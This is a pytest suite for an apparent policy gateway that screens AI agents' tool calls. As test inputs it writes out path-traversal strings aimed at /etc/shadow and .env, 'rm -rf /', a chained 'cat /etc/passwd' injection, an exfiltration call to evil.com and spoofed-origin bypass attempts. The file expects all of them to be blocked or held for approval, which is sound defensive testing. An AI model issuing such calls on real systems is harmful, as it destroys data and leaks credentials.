"""Comprehensive test suite for MCP-Sentry Policy Gateway."""
import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.policy import PolicyEngine
from app.schemas import DecisionEnum, ToolCall

client = TestClient(app)


# ============================================================================
# 1. LEGITIMATE / ALLOWED CALLS
# ============================================================================

def test_legitimate_read_file_allowed() -> None:
    """A valid read_file call within the authorized workspace must be allowed."""
    tool_call = ToolCall(
        request_id="req-legit-001",
        tool_name="read_file",
        arguments={"path": "/workspace/docs/report.txt"},
        origin="agent-analyst-01",
        destination="local-sandbox",
    )
    decision = PolicyEngine.evaluate(tool_call)
    assert decision.decision == DecisionEnum.ALLOW
    assert decision.rule_id == "RULE-ALLOW-READ-FILE"
    assert decision.request_id == "req-legit-001"
    assert "successfully verified" in decision.reason


def test_legitimate_search_kb_allowed() -> None:
    """A valid search_kb request to the knowledge server must be allowed."""
    tool_call = ToolCall(
        request_id="req-legit-002",
        tool_name="search_kb",
        arguments={"query": "security policies for mcp"},
        origin="agent-assistant-02",
        destination="mcp-knowledge-server",
    )
    decision = PolicyEngine.evaluate(tool_call)
    assert decision.decision == DecisionEnum.ALLOW
    assert decision.rule_id == "RULE-ALLOW-SEARCH-KB"


def test_legitimate_query_metrics_allowed() -> None:
    """A valid query_metrics request to the metrics service must be allowed."""
    tool_call = ToolCall(
        request_id="req-legit-003",
        tool_name="query_metrics",
        arguments={"metric_name": "gateway_latency_ms"},
        origin="agent-monitor-01",
        destination="metrics-service",
    )
    decision = PolicyEngine.evaluate(tool_call)
    assert decision.decision == DecisionEnum.ALLOW
    assert decision.rule_id == "RULE-ALLOW-METRICS"


def test_legitimate_write_to_scratch_allowed() -> None:
    """A write operation strictly contained within the scratch directory is allowed."""
    tool_call = ToolCall(
        request_id="req-legit-004",
        tool_name="write_file",
        arguments={"path": "/workspace/scratch/temp_output.json", "content": '{"test": 1}'},
        origin="agent-data-01",
        destination="local-sandbox",
    )
    decision = PolicyEngine.evaluate(tool_call)
    assert decision.decision == DecisionEnum.ALLOW
    assert decision.rule_id == "RULE-ALLOW-WRITE-FILE"


# ============================================================================
# 2. UNKNOWN TOOLS / DEFAULT-DENY
# ============================================================================

def test_unknown_tool_blocked_default_deny() -> None:
    """Any ungranted tool not in the catalog must be rejected by default."""
    tool_call = ToolCall(
        request_id="req-deny-001",
        tool_name="execute_arbitrary_shell",
        arguments={"cmd": "whoami"},
        origin="agent-untrusted",
        destination="local-sandbox",
    )
    decision = PolicyEngine.evaluate(tool_call)
    assert decision.decision == DecisionEnum.BLOCK
    assert decision.rule_id == "RULE-DEFAULT-DENY"
    assert "not in the authorized permissions catalog" in decision.reason


def test_arbitrary_network_tool_blocked() -> None:
    """External exfiltration or arbitrary tool request must be blocked."""
    tool_call = ToolCall(
        request_id="req-deny-002",
        tool_name="http_post_exfiltrate",
        arguments={"url": "http://evil.com", "data": "secret"},
        origin="agent-compromised",
        destination="external-web",
    )
    decision = PolicyEngine.evaluate(tool_call)
    assert decision.decision == DecisionEnum.BLOCK
    assert decision.rule_id == "RULE-DEFAULT-DENY"


# ============================================================================
# 3. PATH TRAVERSAL & UNAUTHORIZED FILE ACCESS
# ============================================================================

@pytest.mark.parametrize(
    "traversal_path",
    [
        "../../etc/passwd",
        "/workspace/../../etc/shadow",
        "workspace/..\\..\\Windows\\System32\\config\\SAM",
        "sandbox/subdir/../../../root/.bash_history",
        "/workspace/%2e%2e/secret.env",
    ],
)
def test_path_traversal_blocked(traversal_path: str) -> None:
    """Path traversal attempts via .. or URL encoding must be blocked."""
    tool_call = ToolCall(
        request_id="req-traversal-001",
        tool_name="read_file",
        arguments={"path": traversal_path},
        origin="agent-attacker",
        destination="local-sandbox",
    )
    decision = PolicyEngine.evaluate(tool_call)
    assert decision.decision == DecisionEnum.BLOCK
    assert decision.rule_id in ("RULE-PATH-TRAVERSAL", "RULE-UNAUTHORIZED-PATH")


def test_sensitive_file_access_blocked() -> None:
    """Direct targeting of sensitive configuration or identity files must be blocked."""
    tool_call = ToolCall(
        request_id="req-sensitive-001",
        tool_name="read_file",
        arguments={"path": "/workspace/.env"},
        origin="agent-01",
        destination="local-sandbox",
    )
    decision = PolicyEngine.evaluate(tool_call)
    assert decision.decision == DecisionEnum.BLOCK
    assert decision.rule_id == "RULE-UNAUTHORIZED-PATH"


def test_unauthorized_root_file_access_blocked() -> None:
    """Accessing files outside permitted roots (e.g. /usr/bin) must be blocked."""
    tool_call = ToolCall(
        request_id="req-unauth-001",
        tool_name="read_file",
        arguments={"path": "/usr/local/bin/run.sh"},
        origin="agent-01",
        destination="local-sandbox",
    )
    decision = PolicyEngine.evaluate(tool_call)
    assert decision.decision == DecisionEnum.BLOCK
    assert decision.rule_id == "RULE-UNAUTHORIZED-PATH"


# ============================================================================
# 4. DISALLOWED / UNAUTHORIZED DESTINATIONS
# ============================================================================

def test_disallowed_destination_blocked() -> None:
    """Using an authorized tool with an unapproved destination must be rejected."""
    tool_call = ToolCall(
        request_id="req-dest-001",
        tool_name="read_file",
        arguments={"path": "/workspace/data/file.txt"},
        origin="agent-01",
        destination="public-internet-host",  # Unapproved destination
    )
    decision = PolicyEngine.evaluate(tool_call)
    assert decision.decision == DecisionEnum.BLOCK
    assert decision.rule_id == "RULE-UNAUTHORIZED-DESTINATION"
    assert "public-internet-host" in decision.reason


# ============================================================================
# 5. INVALID ARGUMENTS & MALFORMED PAYLOADS
# ============================================================================

def test_missing_required_arguments_blocked() -> None:
    """Omitting required arguments must be rejected deterministically."""
    tool_call = ToolCall(
        request_id="req-invalid-001",
        tool_name="read_file",
        arguments={},  # Missing 'path'
        origin="agent-01",
        destination="local-sandbox",
    )
    decision = PolicyEngine.evaluate(tool_call)
    assert decision.decision == DecisionEnum.BLOCK
    assert decision.rule_id == "RULE-INVALID-ARGUMENTS"
    assert "Missing required argument" in decision.reason


def test_invalid_argument_type_blocked() -> None:
    """Passing invalid types (e.g. non-string path) must be rejected."""
    tool_call = ToolCall(
        request_id="req-invalid-002",
        tool_name="read_file",
        arguments={"path": 12345},  # Invalid type
        origin="agent-01",
        destination="local-sandbox",
    )
    decision = PolicyEngine.evaluate(tool_call)
    assert decision.decision == DecisionEnum.BLOCK
    assert decision.rule_id == "RULE-INVALID-ARGUMENTS"


def test_dangerous_command_blocked() -> None:
    """Destructive shell commands or shell injections must be blocked."""
    tool_call = ToolCall(
        request_id="req-cmd-danger-001",
        tool_name="execute_command",
        arguments={"command": "rm -rf /"},
        origin="agent-01",
        destination="isolated-runner",
    )
    decision = PolicyEngine.evaluate(tool_call)
    assert decision.decision == DecisionEnum.BLOCK
    assert decision.rule_id == "RULE-DANGEROUS-COMMAND"


def test_shell_chaining_injection_blocked() -> None:
    """Shell command chaining with semicolons or operators must be blocked."""
    tool_call = ToolCall(
        request_id="req-cmd-chain-001",
        tool_name="execute_command",
        arguments={"command": "echo 'ok'; cat /etc/passwd"},
        origin="agent-01",
        destination="isolated-runner",
    )
    decision = PolicyEngine.evaluate(tool_call)
    assert decision.decision == DecisionEnum.BLOCK
    assert decision.rule_id == "RULE-DANGEROUS-COMMAND"


# ============================================================================
# 6. APPROVAL-REQUIRED ACTIONS
# ============================================================================

def test_database_migration_requires_approval() -> None:
    """High-impact schema migrations must require human approval."""
    tool_call = ToolCall(
        request_id="req-approval-001",
        tool_name="database_migration",
        arguments={"migration_id": "mig_2026_010"},
        origin="agent-db-admin",
        destination="db-server",
    )
    decision = PolicyEngine.evaluate(tool_call)
    assert decision.decision == DecisionEnum.REQUIRE_APPROVAL
    assert decision.rule_id == "RULE-REQUIRE-APPROVAL-DB-MIGRATE"
    assert "requires human approval" in decision.reason


def test_restart_service_requires_approval() -> None:
    """Restarting infrastructure services must require human approval."""
    tool_call = ToolCall(
        request_id="req-approval-002",
        tool_name="restart_service",
        arguments={"service_name": "payment-gateway"},
        origin="agent-ops-01",
        destination="ops-controller",
    )
    decision = PolicyEngine.evaluate(tool_call)
    assert decision.decision == DecisionEnum.REQUIRE_APPROVAL
    assert decision.rule_id == "RULE-REQUIRE-APPROVAL-RESTART"


def test_write_file_outside_scratch_requires_approval() -> None:
    """Modifying non-scratch files must prompt for approval rather than silent write."""
    tool_call = ToolCall(
        request_id="req-approval-003",
        tool_name="write_file",
        arguments={"path": "/workspace/config/app.json", "content": "{}"},
        origin="agent-dev-01",
        destination="local-sandbox",
    )
    decision = PolicyEngine.evaluate(tool_call)
    assert decision.decision == DecisionEnum.REQUIRE_APPROVAL
    assert decision.rule_id == "RULE-REQUIRE-APPROVAL-WRITE"


def test_safe_command_execution_requires_approval() -> None:
    """Even benign commands require approval before running in the container."""
    tool_call = ToolCall(
        request_id="req-approval-004",
        tool_name="execute_command",
        arguments={"command": "echo 'Hello System'"},
        origin="agent-ops-01",
        destination="isolated-runner",
    )
    decision = PolicyEngine.evaluate(tool_call)
    assert decision.decision == DecisionEnum.REQUIRE_APPROVAL
    assert decision.rule_id == "RULE-REQUIRE-APPROVAL-EXEC"


# ============================================================================
# 7. UNTRUSTED CALLER METADATA (SECURITY BYPASS PREVENTION)
# ============================================================================

def test_caller_cannot_grant_self_permissions() -> None:
    """Caller claiming origin='root' or 'admin' cannot bypass policy restrictions."""
    tool_call = ToolCall(
        request_id="req-spoof-001",
        tool_name="database_migration",
        arguments={"migration_id": "drop_all_tables"},
        origin="root-super-administrator",  # Spoofed origin
        destination="db-server",
    )
    decision = PolicyEngine.evaluate(tool_call)
    # The server strictly treats origin as untrusted metadata; still requires approval
    assert decision.decision == DecisionEnum.REQUIRE_APPROVAL
    assert decision.rule_id == "RULE-REQUIRE-APPROVAL-DB-MIGRATE"


def test_caller_cannot_grant_unallowlisted_tool_via_origin() -> None:
    """Spoofed 'admin' origin cannot bypass default-deny on ungranted tools."""
    tool_call = ToolCall(
        request_id="req-spoof-002",
        tool_name="delete_all_databases",
        arguments={"force": True},
        origin="mcp-sentry-internal-bypass",
        destination="local-sandbox",
    )
    decision = PolicyEngine.evaluate(tool_call)
    assert decision.decision == DecisionEnum.BLOCK
    assert decision.rule_id == "RULE-DEFAULT-DENY"


# ============================================================================
# 8. FASTAPI ENDPOINT INTEGRATION TESTS
# ============================================================================

def test_api_evaluate_endpoint_allow() -> None:
    """POST /api/v1/policy/evaluate responds with 200 and structured decision."""
    payload = {
        "request_id": "req-api-001",
        "tool_name": "read_file",
        "arguments": {"path": "/workspace/data/metrics.csv"},
        "origin": "agent-01",
        "destination": "local-sandbox",
    }
    response = client.post("/api/v1/policy/evaluate", json=payload)
    assert response.status_code == 200
    data = response.json()
    assert data["decision"] == "ALLOW"
    assert data["rule_id"] == "RULE-ALLOW-READ-FILE"
    assert data["request_id"] == "req-api-001"
    assert "decision_id" in data
    assert "timestamp" in data


def test_api_evaluate_endpoint_block_traversal() -> None:
    """POST /api/v1/policy/evaluate correctly returns BLOCK decision for traversal."""
    payload = {
        "request_id": "req-api-002",
        "tool_name": "read_file",
        "arguments": {"path": "../../etc/shadow"},
        "origin": "agent-01",
        "destination": "local-sandbox",
    }
    response = client.post("/api/v1/policy/evaluate", json=payload)
    assert response.status_code == 200
    data = response.json()
    assert data["decision"] == "BLOCK"
    assert data["rule_id"] == "RULE-PATH-TRAVERSAL"


def test_api_evaluate_endpoint_validation_error() -> None:
    """Invalid payload schema must trigger a 422 Unprocessable Entity error."""
    # Missing required 'destination' and 'origin'
    payload = {
        "request_id": "req-bad-001",
        "tool_name": "read_file",
        "arguments": {},
    }
    response = client.post("/api/v1/policy/evaluate", json=payload)
    assert response.status_code == 422


def test_api_permissions_endpoint() -> None:
    """GET /api/v1/policy/permissions returns catalog of registered policies."""
    response = client.get("/api/v1/policy/permissions")
    assert response.status_code == 200
    data = response.json()
    assert "tools" in data
    assert len(data["tools"]) >= 5
    tool_names = [t["tool_name"] for t in data["tools"]]
    assert "read_file" in tool_names
    assert "database_migration" in tool_names
